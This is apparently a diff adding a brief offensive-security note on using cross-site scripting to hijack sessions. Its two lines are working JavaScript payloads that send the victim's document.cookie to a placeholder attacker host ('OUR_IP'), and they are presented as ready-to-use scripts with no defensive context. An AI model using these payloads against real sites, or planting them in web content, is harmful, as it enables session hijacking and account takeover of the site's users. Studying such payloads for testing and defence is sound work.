@@ -1,0 +1,6 @@
+We can use XSS for hijacking the session. 
+
+We can use below scripts to hijack the cookies. 
+    document.location='http://OUR_IP/index.php?c='+document.cookie;
+    new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+
